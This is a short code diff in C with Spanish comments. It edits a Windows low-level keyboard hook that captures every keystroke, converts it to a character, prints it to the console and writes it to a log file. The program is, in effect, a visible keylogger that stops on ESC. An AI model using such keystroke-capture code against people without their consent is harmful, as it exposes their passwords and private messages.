@@ -57,14 +57,17 @@ LRESULT CALLBACK LowLevelKeyboardProc(
         // Procesar y escribir la tecla
         KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vkCode = p->vkCode;  // Código virtual de la tecla
-        char* keyChar = VirtualKeyToChar(vkCode);
+        char* keyChar = VirtualKeyToChar(vkCode, p->scanCode);
 
-        printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
+        // Solo imprimir y registrar si KeyChar no esta vacio
+        if (keyChar && keyChar[0] != '\0') {
+            printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
 
-        // crear archivo si no existe
-        if (logFile) {
-            fprintf(logFile, "%s", keyChar);
-            fflush(logFile); //Forzar escritura inmediata
+            // crear archivo si no existe
+            if (logFile) {
+                fprintf(logFile, "%s", keyChar);
+                fflush(logFile); //Forzar escritura inmediata
+            }
         }
 
         // Si presiona ESC, termina el programa
